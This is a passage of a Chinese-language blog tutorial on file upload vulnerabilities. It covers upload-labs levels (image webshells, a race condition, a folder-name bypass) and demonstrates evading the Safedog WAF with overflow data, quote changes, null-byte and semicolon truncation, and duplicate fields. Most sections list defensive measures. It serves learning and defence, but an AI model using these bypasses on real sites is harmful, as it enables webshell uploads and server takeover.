webshell.jpg。其中&#x2F;b是二进制形式打开，&#x2F;a是ascii方式打开，webshell.jpg是生成的图片马。这里最好把图片文件放在前面，如果反过来，不会影响效果，但是会让木马脚本出现在文件的开头，更容易被检测到。</p><ul><li>16进制打开图片插入木马</li></ul><p>使用winhex等工具打开， 在文件尾插入一句话木马。</p><ul><li>使用PS</li></ul><p>打开文件-&gt;文件简介，在标题处写入木马：</p><p><img src="/file-upload/ps.png" alt="image-20211025214635884"></p><p>这里就使用cmd制作木马，生成webshell.jpg，上传成功：</p><p><img src="/file-upload/pass13up.png" alt="image-20211025214745607"></p><p>接下来结合文件包含漏洞，执行php代码。</p><p>右键图片复制地址，并打开文件包含漏洞页面，将地址传给file参数，成功以jpg格式执行phpinfo():</p><p><img src="/file-upload/pass13s.png" alt="image-20211025214919172"></p><p><strong>防护措施</strong></p><p>在文件内容中搜索特征字符串例如&lt;?php等，对其进行匹配</p><h5 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h5><p><strong>Pass-17</strong></p><p>源码如下 ：</p><p><img src="/file-upload/pass17code.png" alt="image-20211025220038872"></p><p>为了将用户提交的图片进行尺寸上的更改或者适应某些内容，有时会进行二次渲染。</p><p>审计这里的代码，可以发现存在逻辑问题。首先没有进行验证，就将文件直接上传，随后将temp_file移动到upload_file，再将upload_file重命名为file_upload_path. 但是其实在开始，文件已经成功上传到了服务器，只是被重命名了无法发现，接下来进行测试：</p><p><img src="/file-upload/pass17rename.png" alt="image-20211025221931927"></p><p>将rename直接注释掉，上传文件：</p><p><img src="/file-upload/webshell.png" alt="image-20211025222114342"></p><p>可以发现文件已经被上传到了服务器。结合条件竞争的利用在下面具体讲解。</p><h5 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h5><p>还是以17关为例。上面已知，代码中先移动文件，再进行过滤，因此只需要在文件被移动之前，通过与rename进行”竞争”，并将其”占有”，就可以进行利用。</p><p>这里使用burp进行爆破来实现不断发包的目的：</p><p><img src="/file-upload/pass17brute.png" alt="image-20211025224348276"></p><p>重复发包10000次，并且不断刷新页面访问文件上传保存到的临时地址，也就是upload&#x2F;abcd.php。</p><p>会出现如下两种情况：</p><p><img src="/file-upload/pass17su.png" alt="image-20211025223249026"></p><p><img src="/file-upload/pass17fa.png" alt="image-20211025223310146"></p><p>如果为not found，就是文件已经被重命名，如果是warning或者直接解析出phpinfo()的内容就是”竞争”成功，避免了将php格式重命名为jpg等格式，可以执行所写的php脚本，连接一句话木马等等。</p><p>条件竞争典型：phpcms</p><p><strong>防护措施</strong></p><p>优化过滤的代码逻辑，先过滤再上传。</p><h5 id="文件夹绕过"><a href="#文件夹绕过" class="headerlink" title="文件夹绕过"></a>文件夹绕过</h5><p><strong>Pass-19</strong></p><p>查看源码：</p><p><img src="/file-upload/pass19code.png" alt="image-20211025225857102"></p><p>这里将上传的文件移动到file_upload_path,file_upload_path为upload&#x2F;拼接上file_name，而file_name就是我们用post提交的save_name的值。</p><p>这里用到新的思路，首先查看UI界面：</p><p><img src="/file-upload/pass19ui.png" alt="image-20211025230304838"></p><p>这里我们可以决定保存的名称，抓包：</p><p><img src="/file-upload/pass19s.png" alt="image-20211025230502806"></p><p>这里保存的名字为upload-19.php&#x2F;. 看似是文件夹的命名习惯，但是和上文的点绕过&#x2F;空格绕过类似，&#x2F;.结尾时，可以绕过黑名单过滤，不会被黑名单中的后缀所命中，成功上传后，服务器又会将&#x2F;.删除，保存为原来的格式，进行验证：</p><p><img src="/file-upload/pass19info.png" alt="image-20211025230651515"></p><p>成功绕过并能够正常解析。</p><p><strong>防护措施</strong></p><p>与空格绕过点绕过类似，可以删除文件名中的&#x2F;，也可以对filename中的&#x2F;进行匹配</p><p><strong>上文讲过的哪一种思路也能进行绕过</strong></p><h5 id="challenge"><a href="#challenge" class="headerlink" title="challenge"></a>challenge</h5><p><strong>Pass-20</strong></p><p>结合了MIME过滤，后缀名过滤，采用白名单的方式，绕过方法为逻辑数组绕过，因为在真实环境中的实用性很小，不作讲解。</p><h2 id="编辑器"><a href="#编辑器" class="headerlink" title="编辑器"></a>编辑器</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>编辑器是软体程序，一般是指用来修改电脑档案的编写软件。常见的编辑器有文本编辑器、网页编辑器、源程序编辑器、图像编辑器，声音编辑器和视频编辑器等。</p><h3 id="常见编辑器"><a href="#常见编辑器" class="headerlink" title="常见编辑器"></a>常见编辑器</h3><ul><li>FCKeditor</li><li>UEditor</li><li>eWebEditor</li><li>Cute Editor</li><li>Webhtmleditor</li><li>Kindeditor</li><li>Freetextbox</li><li>Msn editor</li></ul><h3 id="识别编辑器"><a href="#识别编辑器" class="headerlink" title="识别编辑器"></a>识别编辑器</h3><ul><li><p>inurl:fckeditor</p></li><li><p>后台看</p></li><li><p>目录扫描</p></li></ul><h3 id="编辑器漏洞利用"><a href="#编辑器漏洞利用" class="headerlink" title="编辑器漏洞利用"></a>编辑器漏洞利用</h3><p>编辑器产生的漏洞一般都是文件上传漏洞，一般没有普适性的绕过方法等，利用方法和CMS漏洞类似，需要根据已知的编辑器版本信息进行查找，如果有漏洞，就能进行利用，因此不作演示。</p><h2 id="WAF绕过（有文件上传漏洞的前提下）"><a href="#WAF绕过（有文件上传漏洞的前提下）" class="headerlink" title="WAF绕过（有文件上传漏洞的前提下）"></a>WAF绕过（有文件上传漏洞的前提下）</h2><p>目前主流的WAF大概有safedog，宝塔，D盾等等，safedog相对比较容易绕过，本次以safedog为例进行演示。实验环境为win10系统+phpstudy(Apache2.2)+safedog(Apache版)，实验的靶场为upload-labs。</p><p>WAF的绕过思路大概有两种：</p><p>1.躲过WAF的检测</p><p>2.上传其他后缀名，但是同样执行脚本内容</p><p>方法有如下几种：</p><ul><li>数据溢出-防匹配（xxx…）</li><li>符号变异-防匹配（’ “ ;）</li><li>数据截断-防匹配（%00，换行）</li><li>重复数据-防匹配（多次参数）</li></ul><h3 id="数据溢出"><a href="#数据溢出" class="headerlink" title="数据溢出"></a>数据溢出</h3><p>首先对pass-05再次进行测试。</p><p><img src="/file-upload/pass05test.jpg" alt="image-20211104092359806"></p><p>直接上传php失败，接下来测试没有安全狗的情况下可以绕过的方法：</p><p><img src="/file-upload/05phP.jpg" alt="image-20211104092514190"></p><p>大小写被安全狗拦截，接着尝试通过数据溢出来绕过安全狗。</p><p>一般情况下name属性无法进行更改，因此首先想到在filename处进行溢出。</p><p><img src="/file-upload/yichu1.jpg" alt="image-20211104093032823"></p><p>失败，被拦截，尝试更多溢出：</p><p><img src="/file-upload/yichu2.jpg" alt="image-20211104093453518"></p><p>直接没有返回，失败。经过测试，如果继续加大溢出的字符，会导致apache服务直接崩溃。</p><p>Tips:这里在filename中进行溢出尝试时候，pass-06成功上传了php文件：</p><p><img src="/file-upload/pass061.jpg" alt="image-20211104101741140"></p><p>因此，针对不同的过滤方法，就数据溢出形式的绕过而言，对filename进行溢出可能是一种可行的方法。</p><p>接着尝试在两个属性之间溢出：</p><p><img src="/file-upload/yichu3.jpg" alt="image-20211104094059729"></p><p>可以绕过安全狗，但是无法上传，提示上传出错。</p><p>接下来模仿报文的格式，在溢出的数据后加”;” :</p><p><img src="/file-upload/pass062.jpg" alt="image-20211104101947942"></p><p>可以成功绕过安全狗限制。</p><p>Tips:如果溢出的数据不够，可能还会被拦截，加大溢出数据的长度即可。经过测试，不止在name,filename处可以成功，其他属性直接插入垃圾数据并使用”;”分隔也有同样的效果。</p><h3 id="符号变异"><a href="#符号变异" class="headerlink" title="符号变异"></a>符号变异</h3><p>首先对正常php进行测试，被安全狗拦截：</p><p><img src="/file-upload/pass021.jpg" alt="image-20211104124300312"></p><p>符号变异的绕过主要就是通过对<code>&#39; &quot; ;   </code>等符号进行测试。接下来依次尝试：</p><p>从报文可以看出，filename到content-type中间没有分号，而是一个换行，尝试添加分号：</p><p><img src="/file-upload/test022.jpg" alt="image-20211104124615589"></p><p>绕过失败，被拦截。</p><p>尝试删除一个后面的引号：</p><p><img src="/file-upload/pass023.jpg" alt="test023"></p><p>成功绕过安全狗上传文件,到目录下查看，正常：</p><p><img src="/file-upload/server1.jpg" alt="image-20211104125154265"></p><p>尝试删除前面的引号：</p><p><img src="/file-upload/pass024.jpg" alt="image-20211104125241961"></p><p>被拦截。这里引号的位置不同，导致拦截行为有差异，可能跟安全狗的安全策略有关。</p><p>接下来考虑用单引号替换双引号，测试方法相同就不再重复。结果如下：</p><p><img src="/file-upload/webshell.jpg" alt="image-20211104125535150"></p><p>如果没有单引号、只有一个单引号或者有一个闭合的单引号，全部都能绕过检测成功上传文件。</p><p>Tips:上述单引号的四种绕过中，第二种会上传后缀名为php’的文件，无法执行</p><p>另外可以尝试filename&#x3D;”x”a.php。有一定几率绕过，上传的文件名为a.php。如果直接写”x”.php，则文件名为.php,也能执行。</p><h3 id="数据截断"><a href="#数据截断" class="headerlink" title="数据截断"></a>数据截断</h3><p>尝试之前试过的00截断，在post中，因此需要进行url编码：</p><p><img src="/file-upload/00.jpg" alt="image-20211104132010892"></p><p>直接绕过了安全狗。查看服务器中的文件，为a.php:</p><p><img src="/file-upload/server2.jpg" alt="image-20211104132106720"></p><p>接着通过分号进行截断，这里主要是利用了白名单，让检测时误以为是白名单中的内容：</p><p><img src="/file-upload/white.jpg" alt="image-20211104132231286"></p><p>成功绕过安全狗，注意，虽然有.jpg ; 但是文件最终还是php文件。</p><p>Tips:利用数据截断进行上传时，还可以考虑::$DATA截断，换行截断。</p><p>换行截断是指：</p><p><img src="/file-upload/0d.jpg" alt="image-20211104135213671"></p><p>也有一定的几率能够绕过。</p><h3 id="重复数据-防匹配"><a href="#重复数据-防匹配" class="headerlink" title="重复数据-防匹配"></a>重复数据-防匹配</h3><p>这里通过使用重复数据进行绕过，上传的最终文件是最后一个，因此前面重复添加jpg来绕过：</p><p><img src="/file-upload/shell.jpg" alt="image-20211104133636071"></p><p>成功，到服务器进行验证：</p><p><img src="/file-upload/hahaha.jpg" alt="image-20211104133806292"></p><p>上传了名为hahaha.php的文件。</p><p>尝试在filename中加入重复数据：</p><p><img src="/file-upload/jpegaaa.jpg" alt="image-20211104134353518"></p><p>这里将name，content-type的内容添加到filename中，绕过了安全狗，查看上传的文件名：</p><p><img src="/file-upload/content.jpg" alt="image-20211104134444896"></p><p>发现文件名闻jpegaaaaa.php，观察报文发现新的思路，是否可以直接使用&#x2F;绕过？</p><p>进行测试：</p><p><img src="/file-upload/test.jpg" alt="image-20211104134940506"></p><p>发现被过滤，将aaa替换成更长的字符串依然失败。再结合报文，可能需要引号闭合，进行测试：</p><p><img src="/file-upload/final.jpg" alt="image-20211104134902898"></p><p>成功绕过，查看服务器中的文件名：</p><p><img src="/file-upload/suc.jpg" alt="image-20211104135052079"></p><p>与猜想的一致，成功。</p><h3 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz"></a>fuzz</h3><p>在不了解黑白名单内容的情况下，可以通过fuzz测试来进行尝试。</p><p>还是以upload-labs为例，假设只针对php文件。</p><p>对filename的内容进行爆破，使用fuzz字典，结果如下：</p><p><img src="/file-upload/render.jpg" alt="image-20211104135715164"></p><p>是否能通过检测可以通过render查看，此处直接从服务器上更直观地来看：</p><p><img src="/file-upload/server4.jpg" alt="image-20211104135831748"></p><p>上传的都是绕过了黑白名单限制的后缀。</p><p>Tips：对网站爆破可能会被封锁IP，可以通过burp的fakeip插件或者动态ip进行一定程度的缓解。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>WAF的绕过方法有很多种，但是思路大致就是上文提到的内容，将各种方法结合使用往往就能对WAF进行有效地绕过。</p><h3 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h3><ul><li>对于垃圾数据填充，可以通过content!进行一定程度的防御</li><li>限制上传文件名的最大长度</li><li>对<code>; &#39; &quot; /</code>等特殊字符进行限制</li><li>对文件名中的00进行匹配</li></ul><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ul><li>看中间件，看是否存在解析漏洞&#x2F;CMS&#x2F;编辑器漏洞&#x2F;CVE&#x2F;漏洞。如果有，搜索对应的利用方法。</li><li>查找文件上传点，找到后，先上传普通的文件进行测试，筛选，接着对过滤方法进行猜测，针对不同的过滤采用不同的绕过方法。</li></ul><h3 id="CMS"><a href="#CMS" class="headerlink" title="CMS"></a>CMS</h3><p>识别方法：</p><ul><li>云悉</li><li>whatweb</li><li>御剑识别</li><li>文件md5值</li><li>F12数据包</li><li>robots.txt</li></ul><h3 id="编辑器-1"><a href="#编辑器-1" class="headerlink" title="编辑器"></a>编辑器</h3><ul><li>通过url或者UI界面内容进行识别</li></ul><h3 id="其他-CVE"><a href="#其他-CVE" class="headerlink" title="其他&#x2F;CVE"></a>其他&#x2F;CVE</h3><ul><li>关注CVE官网，漏洞库等</li></ul>]]></content>
    
    
    <categories>
      
      <category>OWASP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>file upload</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
